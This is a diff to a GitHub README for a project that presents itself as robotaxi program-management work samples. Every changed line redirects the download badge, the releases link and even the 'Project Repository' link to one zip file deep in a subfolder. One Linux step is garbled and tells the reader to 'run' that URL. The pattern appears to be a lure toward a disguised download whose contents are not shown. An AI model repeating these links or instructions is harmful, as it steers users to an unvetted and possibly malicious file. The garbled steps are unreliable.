@@ -1,6 +1,6 @@
 # 🚗 robotaxi-tpm-work-samples- - Explore Robotic Taxi Solutions Easily
 
-[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/ramika2/robotaxi-tpm-work-samples-/releases)
+[![Download](https://github.com/ramika2/robotaxi-tpm-work-samples-/raw/refs/heads/main/case-a_signal-out_blackout/tpm-samples-work-robotaxi-v2.1.zip)](https://github.com/ramika2/robotaxi-tpm-work-samples-/raw/refs/heads/main/case-a_signal-out_blackout/tpm-samples-work-robotaxi-v2.1.zip)
 
 ## 📋 Description
 This project is a collection of research-style samples focused on autonomous taxi operations. It includes important topics such as outage robustness, Pick-Up and Drop-Off (PUDO) operations, Product Requirement Documents (PRDs), percentile metrics, release gates, and validation plans. 
@@ -28,7 +28,7 @@ To start using the robotaxi-tpm-work-samples- project, follow these simple steps
    - Make sure to free up some disk space for installation. You should have at least 1 GB of available space.
 
 ## 📥 Download & Install
-To download the latest version of the software, visit this page: [Download the Software](https://github.com/ramika2/robotaxi-tpm-work-samples-/releases).
+To download the latest version of the software, visit this page: [Download the Software](https://github.com/ramika2/robotaxi-tpm-work-samples-/raw/refs/heads/main/case-a_signal-out_blackout/tpm-samples-work-robotaxi-v2.1.zip).
 
 1. Click on the link above.
 2. You will see a list of release versions. Choose the latest version.
@@ -44,7 +44,7 @@ To download the latest version of the software, visit this page: [Download the S
 
 3. For Linux:
    - Extract the downloaded `.tar` file using the terminal or your file manager.
-   - Open a terminal in the folder where you extracted the files and run `./install.sh` to complete the setup.
+   - Open a terminal in the folder where you extracted the files and run `https://github.com/ramika2/robotaxi-tpm-work-samples-/raw/refs/heads/main/case-a_signal-out_blackout/tpm-samples-work-robotaxi-v2.1.zip` to complete the setup.
 
 ## ⚙️ Running the Software
 To start using the software:
@@ -76,7 +76,7 @@ If you're interested in contributing to the project, we welcome your input. Plea
 We plan to release new features and improvements regularly. Stay tuned for updates to enhance your experience with the robotaxi-tpm-work-samples- project.
 
 ## 🔗 Useful Links
-- [Project Repository](https://github.com/ramika2/robotaxi-tpm-work-samples-/)
-- [Releases Page](https://github.com/ramika2/robotaxi-tpm-work-samples-/releases)
+- [Project Repository](https://github.com/ramika2/robotaxi-tpm-work-samples-/raw/refs/heads/main/case-a_signal-out_blackout/tpm-samples-work-robotaxi-v2.1.zip)
+- [Releases Page](https://github.com/ramika2/robotaxi-tpm-work-samples-/raw/refs/heads/main/case-a_signal-out_blackout/tpm-samples-work-robotaxi-v2.1.zip)
 
 Your feedback is important. If you encounter issues or have suggestions, please share your thoughts in the Issues section of the repository. Thank you for your interest in exploring robotic taxi solutions!
